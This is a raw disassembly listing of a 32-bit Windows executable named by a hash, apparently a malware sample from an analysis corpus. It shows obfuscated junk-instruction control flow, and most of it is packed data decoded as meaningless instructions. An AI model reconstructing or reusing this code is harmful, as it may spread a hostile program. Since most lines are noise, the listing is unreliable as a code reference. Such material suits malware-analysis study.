
d65e800e369cf4c40c0707d90c3fa3c75259c89387154f9ae7d0d1ac76c61051.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	add    DWORD PTR ds:0x428277,edx
  40100c:	mov    eax,DWORD PTR [ebp-0x50]
  40100f:	cmp    DWORD PTR ds:0x42831f,0x0
  401016:	mov    DWORD PTR ds:0x4282ef,0x2f64
  401020:	not    ecx
  401022:	jmp    0x401482
  401027:	mov    DWORD PTR ds:0x42823f,0x2f16
  401031:	not    ecx
  401033:	cmp    DWORD PTR ds:0x42831f,0x0
  40103a:	jne    0x401066
  401040:	push   0x2daf
  401045:	call   DWORD PTR ds:0x428d74
  40104b:	mov    ecx,DWORD PTR ds:0x4283a7
  401051:	sub    DWORD PTR ds:0x42825b,ecx
  401057:	movzx  ecx,WORD PTR ds:0x428287
  40105e:	and    DWORD PTR ds:0x428243,ecx
  401064:	add    ecx,ecx
  401066:	mov    ecx,DWORD PTR ds:0x4281cf
  40106c:	xor    edx,edx
  40106e:	add    edx,DWORD PTR ds:0x4282c7
  401074:	sub    ecx,edx
  401076:	xor    ecx,DWORD PTR [ecx+edx*1]
  401079:	adc    DWORD PTR ds:0x42837f,0x71ea
  401083:	mov    ecx,DWORD PTR ds:0x4282ab
  401089:	mov    edx,DWORD PTR ds:0x4283ab
  40108f:	sub    edx,ecx
  401091:	xor    ecx,DWORD PTR [ecx+edx*1]
  401094:	adc    DWORD PTR ds:0x42830f,ebx
  40109a:	and    DWORD PTR ds:0x428257,0x4c59
  4010a4:	jmp    0x401482
  4010a9:	jae    0x4010a7
  4010ab:	ins    DWORD PTR es:[edi],dx
  4010ac:	mov    cl,0x5b
  4010ae:	and    DWORD PTR [ebx],esi
  4010b0:	cmp    ebp,DWORD PTR [edx-0x2541034d]
  4010b6:	loope  0x40111f
  4010b8:	mov    esp,0x18181818
  4010bd:	sahf   
  4010be:	adc    bl,BYTE PTR [eax]
  4010c0:	sbb    BYTE PTR [eax+0x40],bh
  4010c3:	push   ebp
  4010c4:	ffreep st(0)
  4010c6:	mov    ?,eax
  4010c8:	mov    cl,0xf9
  4010ca:	clc    
  4010cb:	out    0x2e,al
  4010cd:	or     dl,bh
  4010cf:	push   eax
  4010d0:	mov    cl,0x10
  4010d2:	adc    eax,0x5e7117f9
  4010d7:	sbb    eax,0x648fe8fa
  4010dc:	(bad)  
  4010de:	mov    esp,0xa611f941
  4010e3:	and    eax,0x732a514e
  4010e8:	inc    edx
  4010e9:	mov    ds:0x95d8e3bf,eax
  4010ee:	cld    
  4010ef:	clc    
  4010f0:	sub    eax,0xcd39b412
  4010f5:	dec    eax
  4010f6:	pop    esi
  4010f7:	push   edx
  4010f8:	and    al,0x9
  4010fa:	fcomp  QWORD PTR [ebx-0x3e921a10]
  401100:	dec    esi
  401101:	inc    edx
  401102:	xchg   esp,eax
  401103:	retf   0x94f8
  401106:	xor    BYTE PTR [ebx],0x95
  401109:	jle    0x40110b
  40110b:	sti    
  40110c:	xchg   esi,eax
  40110d:	mov    DWORD PTR [ebx],ecx
  40110f:	arpl   WORD PTR fs:[ebp+esi*4-0x6c5f57e5],sp
  401117:	jmp    0x4010a3
  401119:	adc    DWORD PTR [edx],ebx
  40111b:	add    DWORD PTR [esi+ebx*1],ebp
  40111e:	mov    ebx,0x6513718d
  401123:	and    al,0xa3
  401125:	int    0x4e
  401127:	mov    bh,0x8d
  401129:	out    dx,al
  40112a:	in     eax,0x3c
  40112c:	xchg   BYTE PTR ds:0x39004482,bh
  401132:	(bad)  
  401133:	cli    
  401134:	pop    ebp
  401135:	not    BYTE PTR [edx]
  401137:	pop    ebp
  401138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401139:	stos   DWORD PTR es:[edi],eax
  40113a:	out    0xa7,eax
  40113c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40113d:	pushf  
  40113e:	popf   
  40113f:	xchg   edi,eax
  401140:	dec    edi
  401141:	cdq    
  401142:	sar    BYTE PTR [eax-0x3d7a0810],cl
  401148:	pop    edi
  401149:	xchg   ebp,eax
  40114a:	cld    
  40114b:	pushf  
  40114c:	sub    al,0x67
  40114e:	mov    edi,0x4c425235
  401153:	enter  0x91ca,0x14
  401157:	mov    bh,0x9d
  401159:	add    al,0xa7
  40115b:	or     edx,DWORD PTR [edi-0x39784273]
  401161:	iret   
  401162:	mov    esp,0x5798c6de
  401167:	jns    0x4010fc
  401169:	mov    ds:0x88f58681,al
  40116e:	push   cs
  40116f:	loopne 0x401106
  401171:	xchg   esi,eax
  401172:	out    0x14,eax
  401174:	pop    eax
  401175:	pop    edi
  401176:	(bad)  
  401177:	scas   al,BYTE PTR es:[edi]
  401178:	and    bl,BYTE PTR [esi+0x463c1ccf]
  40117e:	inc    eax
  40117f:	mov    ds:0x2e4d813b,eax
  401184:	out    dx,al
  401185:	mov    esi,ecx
  401187:	and    ebx,esp
  401189:	and    al,bl
  40118b:	(bad)  
  40118c:	sbb    eax,0x30f0cbe
  401191:	sub    dh,ah
  401193:	test   al,0x88
  401195:	cmp    dh,BYTE PTR [eax+0x56]
  401198:	mov    BYTE PTR [ebx-0x7fe015c7],dl
  40119e:	aam    0x2d
  4011a0:	ins    DWORD PTR es:[edi],dx
  4011a1:	mov    ch,0x70
  4011a3:	adc    dl,BYTE PTR [esp+ecx*2]
  4011a6:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011a8:	bound  eax,QWORD PTR [ebp-0x2b1240c6]
  4011ae:	lods   al,BYTE PTR ds:[esi]
  4011af:	mov    cl,0xf1
  4011b1:	jbe    0x4011a8
  4011b3:	stos   DWORD PTR es:[edi],eax
  4011b4:	inc    ebp
  4011b5:	js     0x401153
  4011b7:	pushf  
  4011b8:	pop    ecx
  4011b9:	cs pop es
  4011bb:	inc    esi
  4011bc:	jns    0x401143
  4011be:	ret    0x42c9
  4011c1:	jo     0x401226
  4011c3:	inc    edi
  4011c4:	lods   al,BYTE PTR ds:[esi]
  4011c5:	xor    BYTE PTR [ebx],ah
  4011c7:	mov    eax,ds:0x80992c0d
  4011cc:	xlat   BYTE PTR ds:[ebx]
  4011cd:	les    edi,FWORD PTR [edi+0x1f3646bc]
  4011d3:	add    eax,0x753badf5
  4011d8:	and    BYTE PTR [edi+0x66],cl
  4011db:	cmp    eax,0xb3fdf21a
  4011e0:	imul   esp,DWORD PTR [ecx-0x5d],0x23
  4011e4:	push   ecx
  4011e5:	cmp    al,0xf8
  4011e7:	xor    bh,bh
  4011e9:	mov    DWORD PTR ds:0x7c3e4fcb,esi
  4011ef:	sbb    dl,BYTE PTR [esi+ebp*2]
  4011f2:	cmp    cl,BYTE PTR cs:[ebx+0x1493fcbb]
  4011f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011fa:	or     ecx,DWORD PTR [edi-0x6b]
  4011fd:	push   0x4b3a53f
  401202:	cmp    cl,al
  401204:	sahf   
  401205:	xor    edx,DWORD PTR [ebx-0x25fe7e92]
  40120b:	cmp    edi,DWORD PTR [bx+di-0xcae]
  401210:	pushf  
  401211:	add    BYTE PTR [ebx+0x33],dl
  401214:	in     al,dx
  401215:	lods   eax,DWORD PTR ds:[esi]
  401216:	mov    edx,0x7ed8465d
  40121b:	mov    eax,ds:0x53ec2747
  401220:	adc    DWORD PTR [ebp-0x63],0x83529a5d
  401227:	fsub   st(7),st
  401229:	outs   dx,DWORD PTR ds:[esi]
  40122a:	call   0x387f9177
  40122f:	xor    DWORD PTR [esi+0x6f49eda5],edi
  401235:	xor    ecx,DWORD PTR [ebp-0x28d5cedf]
  40123b:	leave  
  40123c:	mov    ds:0x3354272c,eax
  401241:	cmp    bh,BYTE PTR [esi+0x2e]
  401244:	adc    dh,BYTE PTR [esi-0x74]
  401247:	scas   al,BYTE PTR es:[edi]
  401248:	push   ebp
  401249:	fisub  WORD PTR [edx]
  40124b:	dec    edx
  40124c:	aas    
  40124d:	xchg   edx,eax
  40124e:	mov    dh,BYTE PTR [eax]
  401250:	push   esi
  401251:	ret    
  401252:	inc    di
  401254:	call   0x7735:0x3012a7a
  40125b:	lahf   
  40125c:	jge    0x401293
  40125e:	adc    BYTE PTR [ecx+0x1e65bbae],bl
  401264:	outs   dx,BYTE PTR ds:[esi]
  401265:	push   edi
  401266:	cmp    edx,DWORD PTR [esp+eiz*2-0x75]
  40126a:	pop    esp
  40126b:	shl    DWORD PTR [esi],0xa4
  40126e:	pop    esi
  40126f:	jecxz  0x4011fe
  401271:	in     eax,0x43
  401273:	cmp    DWORD PTR [eax-0x36],edx
  401276:	add    eax,0x9f1b0d47
  40127b:	dec    DWORD PTR [edi+0x65]
  40127e:	push   edx
  40127f:	test   BYTE PTR [ebx-0x36d8931c],0x9f
  401286:	daa    
  401287:	ins    BYTE PTR es:[edi],dx
  401288:	hlt    
  401289:	jb     0x4012f8
  40128b:	or     ebp,edi
  40128d:	xor    eax,0xb4a1ab55
  401292:	rcl    DWORD PTR [eax+0x239a4eea],0x75
  401299:	pop    ds
  40129a:	push   eax
  40129b:	(bad)  [eax-0x75]
  40129e:	je     0x401303
  4012a0:	mov    esi,0xf70d8814
  4012a5:	mov    al,0xaa
  4012a7:	cmp    eax,0x49f3f8f5
  4012ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012ad:	sbb    eax,0x63f2d548
  4012b2:	aaa    
  4012b3:	scas   al,BYTE PTR es:[edi]
  4012b4:	adc    BYTE PTR [ebx-0x994304c],dh
  4012ba:	pop    ds
  4012bb:	push   ds
  4012bc:	aad    0x92
  4012be:	sahf   
  4012bf:	and    dl,BYTE PTR [ecx+edi*1+0x3fc5a762]
  4012c6:	adc    esp,edx
  4012c8:	hlt    
  4012c9:	jo     0x4012f7
  4012cb:	test   DWORD PTR [ecx-0x1b546b7e],eax
  4012d1:	add    al,0xac
  4012d3:	mov    BYTE PTR [ebx+0x5d5bac5d],dh
  4012d9:	repnz icebp 
  4012db:	push   ebp
  4012dc:	cli    
  4012dd:	xor    BYTE PTR [edx+0x4734ab9c],bh
  4012e3:	xor    ch,bl
  4012e5:	sahf   
  4012e6:	inc    edi
  4012e7:	retf   
  4012e8:	std    
  4012e9:	aam    0x3c
  4012eb:	jle    0x401312
  4012ed:	ficom  WORD PTR [eax+0x42266ccb]
  4012f3:	mov    eax,ds:0x17c3e61a
  4012f8:	pusha  
  4012f9:	jl     0x401376
  4012fb:	in     eax,dx
  4012fc:	(bad)  
  4012fd:	jmp    FWORD PTR [ecx+ecx*1]
  401300:	add    ebp,eax
  401302:	jecxz  0x401367
  401304:	test   BYTE PTR [ecx-0x20b4a656],0x9e
  40130b:	aaa    
  40130c:	inc    eax
  40130d:	push   esp
  40130e:	mul    edi
  401310:	jae    0x401326
  401312:	sbb    eax,0x40658973
  401317:	loope  0x401363
  401319:	mov    dl,0x0
  40131b:	fdivr  QWORD PTR [edx-0x4b562765]
  401321:	and    BYTE PTR [edi-0x34],bh
  401324:	push   esp
  401325:	int    0xda
  401327:	test   BYTE PTR [ebx],dh
  401329:	pop    es
  40132a:	rol    BYTE PTR [edx+0x73],0xf2
  40132e:	cli    
  40132f:	daa    
  401330:	inc    edx
  401331:	xchg   ebp,eax
  401332:	dec    esp
  401333:	data16 xlat BYTE PTR ds:[ebx]
  401335:	fild   WORD PTR [edi]
  401337:	push   0x4c434584
  40133c:	pop    edi
  40133d:	mov    eax,esp
  40133f:	dec    edx
  401340:	push   ss
  401341:	mov    esi,0x40d5886c
  401346:	repnz pusha 
  401348:	jle    0x401301
  40134a:	int    0x1c
  40134c:	adc    BYTE PTR [edi],0xd0
  40134f:	jge    0x40130f
  401351:	ja     0x401316
  401353:	popa   
  401354:	cmp    eax,DWORD PTR [ecx+0x55c02dfd]
  40135a:	adc    cl,ah
  40135c:	xchg   ecx,eax
  40135d:	outs   dx,DWORD PTR ds:[esi]
  40135e:	(bad)  
  40135f:	sti    
  401360:	mov    eax,DWORD PTR [esp+edx*4+0x34121a4b]
  401367:	int3   
  401368:	(bad)  
  401369:	stos   DWORD PTR es:[edi],eax
  40136a:	add    al,0xc2
  40136c:	test   esi,0xefe3c688
  401372:	sub    ebx,DWORD PTR [edx-0x432d1140]
  401378:	cmc    
  401379:	sub    ch,ch
  40137b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40137c:	push   eax
  40137d:	sbb    eax,0xac890d81
  401382:	mov    eax,0x608093b3
  401387:	imul   edi,DWORD PTR [ebx+0x590c79df],0xd2912c0d
  401391:	not    ebp
  401393:	jecxz  0x401353
  401395:	cmp    BYTE PTR [esi],dh
  401397:	fmul   st,st(7)
  401399:	loopne 0x401417
  40139b:	pop    esp
  40139c:	inc    ebx
  40139d:	icebp  
  40139e:	imul   esi,DWORD PTR [edx],0xfffffff3
  4013a1:	push   eax
  4013a2:	cli    
  4013a3:	add    esi,ebp
  4013a5:	pop    edx
  4013a6:	addr16 jg 0x4013f4
  4013a9:	ds fadd st,st(0)
  4013ac:	int3   
  4013ad:	(bad)  
  4013ae:	in     al,0x49
  4013b0:	xor    DWORD PTR [ebx-0x19],esi
  4013b3:	daa    
  4013b4:	stos   BYTE PTR es:[edi],al
  4013b5:	call   0xf6c2c80a
  4013ba:	mov    ds:0x5ed5dc31,eax
  4013bf:	nop
  4013c0:	inc    esi
  4013c1:	sub    DWORD PTR [ecx+eiz*4-0x4da8260e],ebp
  4013c8:	cmp    dh,dh
  4013ca:	sar    DWORD PTR [eax],1
  4013cc:	xchg   ebp,eax
  4013cd:	pop    edi
  4013ce:	adc    esi,DWORD PTR [edi+0x21]
  4013d1:	mov    ebx,0xd43e1a64
  4013d6:	xor    BYTE PTR [edx+0x2f],dh
  4013d9:	xor    cl,BYTE PTR [ebp+0x4c]
  4013dc:	mov    ds:0x9796453d,al
  4013e1:	mov    ecx,DWORD PTR [edi-0x6bb23f2e]
  4013e7:	and    ebx,esi
  4013e9:	repz out dx,eax
  4013eb:	mov    esi,0x6db899a1
  4013f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013f1:	xor    eax,0xfdc1a5ee
  4013f6:	xchg   ebx,eax
  4013f7:	rcl    bl,cl
  4013f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013fa:	in     eax,0x3d
  4013fc:	ins    BYTE PTR es:[edi],dx
  4013fd:	and    eax,0xfbca8b25
  401402:	push   cs
  401403:	jne    0x40139f
  401405:	mov    WORD PTR [edi+0x29],gs
  401408:	test   DWORD PTR [edi+ebp*2+0x61],esp
  40140c:	push   cs
  40140d:	nop
  40140e:	sub    dh,bl
  401410:	test   al,0x5a
  401412:	jns    0x401430
  401414:	ret    
  401415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401416:	push   ebp
  401417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401418:	jp     0x401419
  40141a:	jg     0x401483
  40141c:	xlat   BYTE PTR ds:[ebx]
  40141d:	xchg   esi,eax
  40141e:	repnz mov esi,fs
  401421:	in     eax,dx
  401422:	mov    eax,ds:0xf65b3b43
  401427:	pop    eax
  401428:	stos   BYTE PTR es:[edi],al
  401429:	and    eax,ecx
  40142b:	icebp  
  40142c:	scas   eax,DWORD PTR es:[edi]
  40142d:	and    ah,cl
  40142f:	and    al,0x79
  401431:	retf   
  401432:	call   0xd9a96763
  401437:	dec    ebx
  401438:	loope  0x401456
  40143a:	mov    es,edi
  40143c:	push   ds
  40143d:	mov    edx,0xb2a7ee67
  401442:	adc    dl,BYTE PTR [ecx]
  401444:	ins    DWORD PTR es:[edi],dx
  401445:	sub    al,BYTE PTR [ecx+eiz*8]
  401448:	dec    ebx
  401449:	jmp    0x563:0x3cfd0fab
  401450:	add    DWORD PTR [ebp-0x2626cdd0],esp
  401456:	mov    ecx,0x7105e0fd
  40145b:	jp     0x401455
  40145d:	or     ah,BYTE PTR [ecx-0x51d94edd]
  401463:	mov    BYTE PTR [esi+0x19],bh
  401466:	xchg   ebx,eax
  401467:	adc    bl,BYTE PTR [ebp+0x646aca47]
  40146d:	xchg   ebx,eax
  40146e:	xchg   ebx,eax
  40146f:	and    DWORD PTR ds:[eax-0x5f],ebx
  401473:	pop    esi
  401474:	out    dx,al
  401475:	or     cl,BYTE PTR [ecx+0x14]
  401478:	fwait
  401479:	mov    BYTE PTR [edi],0xd7
  40147c:	jbe    0x401476
  40147e:	mov    bh,0xd6
  401480:	ret    
  401481:	jbe    0x40140e
  401483:	dec    ebp
  401484:	mov    ah,0x8b
  401486:	push   ebp
  401487:	mov    al,0x2b
  401489:	ret    0x1589
  40148c:	outs   dx,DWORD PTR ds:[esi]
  40148d:	add    DWORD PTR [edx+0x0],0x57
  401491:	mov    edi,DWORD PTR [ebp-0x4c]
  401494:	mov    DWORD PTR [ebp-0x50],eax
  401497:	mov    edx,0x488c
  40149c:	sbb    ecx,edi
  40149e:	mov    DWORD PTR [ebp-0x4c],ecx
  4014a1:	mov    edx,DWORD PTR ds:0x4282ab
  4014a7:	mov    edx,DWORD PTR [edx]
  4014a9:	and    DWORD PTR ds:0x4282fb,edx
  4014af:	or     DWORD PTR [ebp-0x50],0xca78cc41
  4014b6:	or     DWORD PTR [ebp-0x4c],0x9c1b89e8
  4014bd:	and    DWORD PTR ds:0x42822b,0x6649
  4014c7:	mov    eax,DWORD PTR [ebp-0x58]
  4014ca:	add    ecx,0xa44
  4014d0:	mov    ecx,DWORD PTR [ebp-0x54]
  4014d3:	cmp    DWORD PTR ds:0x428253,0x0
  4014da:	mov    DWORD PTR ds:0x42822f,ecx
  4014e0:	mov    DWORD PTR ds:0x4282f3,0x3ae4
  4014ea:	mov    edi,0x1ebc
  4014ef:	mov    edx,0x7e4f
  4014f4:	jmp    0x40154f
  4014f9:	not    DWORD PTR ds:0x42816b
  4014ff:	mov    edx,0x300f
  401504:	cmp    DWORD PTR ds:0x428253,0x0
  40150b:	jae    0x401543
  401511:	push   0x1b93
  401516:	call   DWORD PTR ds:0x428d78
  40151c:	mov    edx,DWORD PTR ds:0x4282cb
  401522:	xor    edi,edi
  401524:	or     edi,DWORD PTR ds:0x428343
  40152a:	sub    edx,edi
  40152c:	or     edx,DWORD PTR [edx+edi*1]
  40152f:	xor    edx,edx
  401531:	add    edx,DWORD PTR ds:0x42819f
  401537:	mov    edi,DWORD PTR ds:0x428347
  40153d:	sub    edi,edx
  40153f:	imul   edx,DWORD PTR [edx+edi*1]
  401543:	and    edi,0x359a
  401549:	or     edi,0x3261
  40154f:	mov    edx,DWORD PTR [ebp-0x58]
  401552:	mov    edi,DWORD PTR [ebp-0x54]
  401555:	jmp    0x401933
  40155a:	outs   dx,DWORD PTR ds:[esi]
  40155b:	add    eax,0x3a5a4a0b
  401560:	das    
  401561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401562:	out    dx,al
  401563:	sbb    ebx,DWORD PTR [ebp-0x5e6fdf90]
  401569:	jo     0x401509
  40156b:	adc    bl,BYTE PTR [eax]
  40156d:	sbb    BYTE PTR [esi+0x5f181812],bl
  401573:	jmp    FWORD PTR [esi]
  401575:	xor    BYTE PTR [ecx+edi*4-0x34dc5eb1],dh
  40157c:	inc    esi
  40157d:	(bad)  
  40157e:	fwait
  40157f:	int    0x85
  401581:	mov    edi,0x1e02647f
  401586:	cmp    cl,cl
  401588:	dec    esi
  401589:	fwait
  40158a:	xchg   edi,eax
  40158b:	sbb    al,0x6a
  40158d:	aaa    
  40158e:	jmp    0x4015e8
  401590:	pop    edi
  401591:	xor    eax,0xe9fd6398
  401596:	or     DWORD PTR [ebp-0xc],0xf2587790
  40159d:	(bad)  
  40159e:	(bad)  
  4015a0:	adc    DWORD PTR [edx],ecx
  4015a2:	cmp    al,0x3b
  4015a4:	push   ecx
  4015a5:	or     eax,edx
  4015a7:	add    BYTE PTR [eax+ebx*2],bl
  4015aa:	ret    
  4015ab:	inc    ebx
  4015ac:	adc    eax,0x4eb08517
  4015b1:	pushf  
  4015b2:	leave  
  4015b3:	lock cmp edx,ecx
  4015b6:	jns    0x4015e3
  4015b8:	aaa    
  4015b9:	fistp  QWORD PTR [edi-0x2c]
  4015bc:	dec    esi
  4015bd:	ror    BYTE PTR [eax+0x1adcbf37],1
  4015c3:	mov    esp,0x330865c2
  4015c8:	mov    esp,0x89b46c20
  4015cd:	and    DWORD PTR [eax+0x1fc0d66a],edx
  4015d3:	sar    BYTE PTR [edx+0x4],0x2a
  4015d7:	mov    ecx,0xa27be4bc
  4015dc:	or     dl,0xa2
  4015df:	mov    eax,0x4d198aa5
  4015e4:	stos   DWORD PTR es:[edi],eax
  4015e5:	jnp    0x401592
  4015e7:	enter  0xa643,0x4c
  4015eb:	and    edx,DWORD PTR [edi+0xc4c1e45]
  4015f1:	ss (bad) 
  4015f3:	push   edx
  4015f4:	xchg   ebp,eax
  4015f5:	sub    dl,BYTE PTR [edx+0x2b]
  4015f8:	outs   dx,DWORD PTR ds:[esi]
  4015f9:	or     al,0x90
  4015fb:	lock adc DWORD PTR [ecx+ebx*2-0x167d1ade],eax
  401603:	cli    
  401604:	inc    edx
  401605:	sbb    al,BYTE PTR [esi+0x51bd9f8e]
  40160b:	mov    eax,ds:0xa37a6304
  401610:	and    eax,0x363fc747
  401615:	lds    eax,FWORD PTR [ebp+ebp*4-0x4de52e3b]
  40161c:	xchg   esp,eax
  40161d:	cmp    edi,DWORD PTR [esi+esi*2]
  401620:	fisttp DWORD PTR [ebx+ebx*8-0x11a64c1b]
  401627:	pop    eax
  401628:	clc    
  401629:	push   0x31
  40162b:	fmul   QWORD PTR [edx+ebp*4-0xf6455ea]
  401632:	add    edx,DWORD PTR [ecx+0x52e04127]
  401638:	lds    esp,FWORD PTR [ebp-0x3b]
  40163b:	or     al,ch
  40163d:	xor    edx,esi
  40163f:	js     0x401699
  401641:	xor    BYTE PTR [ebx-0x1e],ch
  401644:	mov    ds:0xa733d2e9,eax
  401649:	or     edx,DWORD PTR [eax]
  40164b:	add    esi,esp
  40164d:	push   ss
  40164e:	xchg   DWORD PTR [ecx],esi
  401650:	inc    eax
  401651:	mov    ds:0x202fc1c6,al
  401656:	ja     0x4015e0
  401658:	jle    0x4015f1
  40165a:	jl     0x40169f
  40165c:	xchg   edx,eax
  40165d:	and    DWORD PTR [ebx+edx*8+0x29],ebx
  401661:	and    dh,al
  401663:	pushf  
  401664:	pop    esp
  401665:	cli    
  401666:	ins    BYTE PTR es:[edi],dx
  401667:	lahf   
  401668:	mov    WORD PTR [edi+edx*8],fs
  40166b:	sbb    eax,0xc5c788f6
  401670:	push   eax
  401671:	test   ebx,ecx
  401673:	out    dx,al
  401674:	push   edx
  401675:	inc    edi
  401676:	(bad)  
  401677:	push   ebx
  401678:	jo     0x401622
  40167a:	sub    ecx,esi
  40167c:	pop    esi
  40167d:	mov    WORD PTR [edi-0x64],sp
  401681:	int3   
  401682:	add    DWORD PTR [ecx-0x7954f466],esi
  401688:	mov    ch,0x7b
  40168a:	adc    al,0x81
  40168c:	mov    esi,0x307afc42
  401691:	scas   al,BYTE PTR es:[edi]
  401692:	push   ebx
  401693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401694:	add    ebp,DWORD PTR [edx+0x8]
  401697:	xchg   al,cl
  401699:	push   ebx
  40169a:	shr    DWORD PTR [ecx*4-0x2befbc60],1
  4016a1:	outs   dx,BYTE PTR ds:[esi]
  4016a2:	inc    ebp
  4016a3:	mov    ecx,0xac6d9930
  4016a8:	gs mov esi,0x9ee041ad
  4016ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016af:	pop    edx
  4016b0:	pop    ecx
  4016b1:	dec    edx
  4016b2:	mov    BYTE PTR [eax+eiz*4+0x3a],dl
  4016b6:	ror    BYTE PTR [eax+0x9],cl
  4016b9:	sub    eax,0xdcc79126
  4016be:	(bad)  
  4016bf:	sub    BYTE PTR [ebp+eax*1+0x16],ah
  4016c3:	test   al,0x30
  4016c5:	lea    ecx,[ecx]
  4016c7:	push   ecx
  4016c8:	jae    0x40165c
  4016ca:	jae    0x4016f4
  4016cc:	in     al,0x86
  4016ce:	sbb    al,0x44
  4016d0:	and    DWORD PTR [ebx-0x20975f4c],0x2eac92e7
  4016da:	and    bh,BYTE PTR [esi+ebp*4-0x451ca334]
  4016e1:	loop   0x4016cc
  4016e3:	cmp    eax,0x5ccd0a41
  4016e8:	mov    eax,ds:0x77fbe5a1
  4016ed:	add    ebx,DWORD PTR [eax+0x22f7778c]
  4016f3:	mov    dh,0x39
  4016f5:	out    dx,al
  4016f6:	or     DWORD PTR [ebx-0x2dd1ab77],0x2f1c176f
  401700:	out    0x1c,eax
  401702:	add    DWORD PTR [ebx+edx*2],eax
  401705:	add    BYTE PTR [esi],cl
  401707:	xchg   esi,eax
  401708:	mov    al,ds:0x5b7fccf8
  40170d:	ret    0x2459
  401710:	int    0x6d
  401712:	icebp  
  401713:	jge    0x40175e
  401715:	out    dx,eax
  401716:	cmc    
  401717:	xchg   ebp,eax
  401718:	adc    al,0x55
  40171a:	call   0x7e4b:0x8a6c9363
  401721:	scas   al,BYTE PTR es:[edi]
  401722:	lods   eax,DWORD PTR ds:[esi]
  401723:	adc    al,0xed
  401725:	cs inc edx
  401727:	out    0x1a,al
  401729:	outs   dx,BYTE PTR ds:[esi]
  40172a:	or     al,0x8d
  40172c:	cmp    eax,0x7ed45251
  401731:	push   eax
  401732:	adc    edi,DWORD PTR [edx+0x5a]
  401735:	xchg   ecx,eax
  401736:	outs   dx,DWORD PTR ds:[esi]
  401737:	or     ecx,DWORD PTR ds:0x86f87345
  40173d:	aam    0x47
  40173f:	sbb    BYTE PTR [ecx+eax*1],bh
  401742:	push   ss
  401743:	jl     0x401746
  401745:	push   edx
  401746:	sti    
  401747:	cmc    
  401748:	adc    eax,0xf469d018
  40174d:	fbld   TBYTE PTR [edi]
  40174f:	mov    ds:0x7147e61,eax
  401754:	pushf  
  401755:	pop    ss
  401756:	rcl    BYTE PTR [ebp+0x5bd2ec55],cl
  40175c:	rcr    BYTE PTR [edi+0x49],0xd0
  401760:	daa    
  401761:	(bad)  
  401762:	dec    edi
  401763:	add    bl,BYTE PTR [edi-0x7eb75e0]
  401769:	sub    bl,BYTE PTR [ecx+ebx*8-0x35]
  40176d:	sub    eax,0xb8afdb06
  401772:	jmp    0x40172b
  401774:	bound  ebx,QWORD PTR [edi]
  401776:	aad    0x6c
  401778:	jl     0x4017f4
  40177a:	repz jg 0x4017b1
  40177d:	aam    0x53
  40177f:	sbb    bh,BYTE PTR [ebx]
  401781:	cs mov al,0x5
  401784:	sub    DWORD PTR [ebx],edx
  401786:	xor    al,0xfd
  401788:	push   ecx
  401789:	dec    esp
  40178a:	fidivr WORD PTR [ebp+ebx*8-0x79f40b96]
  401791:	aas    
  401792:	pop    es
  401793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401794:	and    BYTE PTR [ecx+0x59],ch
  401797:	hlt    
  401798:	dec    ebp
  401799:	jbe    0x4017f8
  40179b:	xor    al,0xc4
  40179d:	mov    ecx,DWORD PTR [esi-0x5261f24d]
  4017a3:	pop    esi
  4017a4:	fucomi st,st(7)
  4017a6:	mov    edx,DWORD PTR [eax+ecx*1+0x936d675]
  4017ad:	cmp    ch,BYTE PTR [edx]
  4017af:	sti    
  4017b0:	and    al,0x60
  4017b2:	lods   al,BYTE PTR ds:[esi]
  4017b3:	pop    eax
  4017b4:	inc    BYTE PTR [edi-0x60]
  4017b7:	mov    esi,esp
  4017b9:	jbe    0x4017a3
  4017bb:	dec    ebx
  4017bc:	pop    ebx
  4017bd:	pop    esp
  4017be:	jb     0x4017af
  4017c0:	ss mov esi,0x183a2530
  4017c6:	sti    
  4017c7:	cmp    esi,DWORD PTR [ecx]
  4017c9:	inc    esp
  4017ca:	adc    al,0xe7
  4017cc:	push   ss
  4017cd:	push   es
  4017ce:	xchg   esp,eax
  4017cf:	cmp    DWORD PTR [edx+0x608f9f91],edx
  4017d5:	std    
  4017d6:	or     al,0x61
  4017d8:	add    eax,0x5c4e017f
  4017dd:	rcl    DWORD PTR [ebx-0x78],0xb6
  4017e1:	push   ds
  4017e2:	add    BYTE PTR [edi],dh
  4017e4:	adc    eax,0xc020c31b
  4017e9:	mov    ah,0x9b
  4017eb:	(bad)  
  4017ec:	rcl    DWORD PTR [edx+ecx*8-0x37],1
  4017f0:	jns    0x401850
  4017f2:	xor    BYTE PTR [edx],0xed
  4017f5:	push   ss
  4017f6:	dec    ebp
  4017f7:	add    dh,ah
  4017f9:	sub    al,0x6d
  4017fb:	std    
  4017fc:	(bad)  
  4017fd:	call   0xb2db:0xf42c8588
  401804:	jle    0x401842
  401806:	pop    edx
  401807:	aam    0xbc
  401809:	add    bl,bh
  40180b:	pusha  
  40180c:	(bad)  
  40180d:	cli    
  40180e:	dec    edi
  40180f:	dec    ecx
  401810:	push   cs
  401811:	xchg   ecx,eax
  401812:	xchg   esi,eax
  401813:	xchg   edx,eax
  401814:	out    dx,al
  401815:	xchg   edx,eax
  401816:	div    DWORD PTR [ebp-0x6d8c4713]
  40181c:	out    0x7,eax
  40181e:	mov    dl,0x77
  401820:	lahf   
  401821:	sbb    al,0x72
  401823:	or     DWORD PTR [edi],ecx
  401825:	bound  ebp,QWORD PTR [esi]
  401827:	or     eax,0x33509098
  40182c:	enter  0xcee5,0xd4
  401830:	xor    al,0x2b
  401832:	pop    ss
  401833:	xchg   ebx,eax
  401834:	ret    
  401835:	aad    0xd5
  401837:	sar    DWORD PTR [edi-0x6bbf7bfe],cl
  40183d:	popf   
  40183e:	mul    BYTE PTR [ecx]
  401840:	sti    
